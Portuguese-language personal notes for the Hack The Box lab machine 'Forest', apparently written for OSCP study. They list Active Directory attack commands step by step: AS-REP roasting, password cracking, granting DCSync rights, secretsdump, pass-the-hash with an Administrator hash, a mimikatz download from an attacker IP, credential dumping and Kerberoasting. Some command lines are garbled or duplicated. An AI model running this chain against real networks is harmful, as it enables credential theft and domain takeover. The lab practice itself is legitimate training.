Forest
========================

# Enumeration

    sudo nmap_enum forest.htb | tee nmap_output.txt
    
    rpcclient -U '' -N 10.10.10.161
    enumdomusers
    
![qownnotes-media-QbmBbN](../../../media/qownnotes-media-QbmBbN.png)

Joguei no arquivo users.txt

    impacket-GetNPUsers -usersfile users.txt -dc-ip 10.10.10.161 htb.local/
    
![qownnotes-media-iEUvtj](../../../media/qownnotes-media-iEUvtj.png)

    john --wordlist=/usr/share/wordlists/rockyou.txt hashists/rockyou.txt hash.txt

![qownnotes-media-oHuWhU](../../../media/qownnotes-media-oHuWhU.png)

    impacket-psexec htb.localsvc-alfreso:s3rvice@10.10.10.161impacket-psexec htb.localsvc-alfreso:s3rvice@10.10.10.161
    
    enum4linux -a -A -u svc-alfresco -p s3rvice 10.10.10.161

Nada desses dois ajudarem muito. Bora dee booldhound:

    
    
    impacket-GetUserSPNs 'htb.local/svc-alfresco:s3rvice' -dc-ip 10.10.10.161 -request

# Exploitation

    evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

Como não foi possível executar o bloodhound dee maneira remota, utilizei o SharpHound localmene na máquina via winrm

    ./sh.exe -c all --LdapUsername svc-alfresco --LdapPassword s3rvice
    
![qownnotes-media-RdjFti](../../../media/qownnotes-media-RdjFti.png)

Não deu certo jogar os .json no bloodhound. Tentei com outro comando que aparentemente está funcionando:

    bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb -c all -ns 10.10.10.161
 
Dessa forma funcionou. Fazendo uma análise que não pude entender bem aqui, mas acho que pra fins da OSCP não ttem tanta relevância é a questão de meu usuário ter permissão de adicionar usuário ao domínio

# Privilege Escalation

    net user acosta Welcome1! /add /domain
    net group "Exchange Windows Permissions" /add acosta
    
    $pass = convertto-securestring 'Welcome1!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential('htb\acosta', $pass)
    Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity acosta -Rights DCSync
    
Aqui temos uma outra forma de fazer isso também que seria sem a utilização do powershell e sim com o impacket:

    impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user redteam
    firefox http://127.0.0.1/privexchange
    #Fazer login com as credenciais do usuário:
    
![qownnotes-media-hmVWSD](../../../media/qownnotes-media-hmVWSD.png)



![qownnotes-media-dKfQMi](../../../media/qownnotes-media-dKfQMi.png)


A essa altura do campeonato, meu usuário acosta já tinha o DCSync e assim eu já poderia executar o comando:

    impacket-secretsdump htb.local/acosta:Welcome1!@10.10.10.161

![qownnotes-media-fszsny](../../../media/qownnotes-media-fszsny.png)

    impacket-psexec htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
    

## ADICIONAIS
**ALGUNS ADENDOS A MANEIRA DE EXPLORAR A MÁQUINA COMO UM TODO**

Acessando a máquina novamente


### Cached credentials storage and retrieval

    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161  
    
    (new-object net.webclient).downloadfile('http://10.10.14.17/mimikatz.exe','c:\temp\m.exe')
    ./m.exe
    privilege::debug
    sekurlsa::logonpasswords

![qownnotes-media-seBLBe](../../../media/qownnotes-media-seBLBe.png)

Outra forma seria enumerar os tickets kerberos existentes na máquina:

    sekurlsa::tickets

![qownnotes-media-ePROPT](../../../media/qownnotes-media-ePROPT.png)

Nesse caso também não conseguimos nada.

### Service Principal Names

    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="serviceprincipalname=*";$Result = $Searcher.FindAll();Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}}
    
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'IMAP/EXCH01.htb.local'
    klist

![qownnotes-media-obcRGy](../../../media/qownnotes-media-obcRGy.png)


![qownnotes-media-IszPIc](../../../media/qownnotes-media-IszPIc.png)

Mas o que foi interessante é que alguns desses tickets já existiam na máquina, então prosseguimos da seguinte maneira:

    kerberos::list /export
 
![qownnotes-media-lkUpSZ](../../../media/qownnotes-media-lkUpSZ.png)

Com isso pudemos executar o seguinte comando para tentar quebrar os tickets:

    python /home/acosta/owncloud/Area_de_trabalho/tools/linux/5-lateral_movement/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 0-60a10000-forest\$@krbtgt~HTB.LOCAL-HTB.LOCAL.kirbi


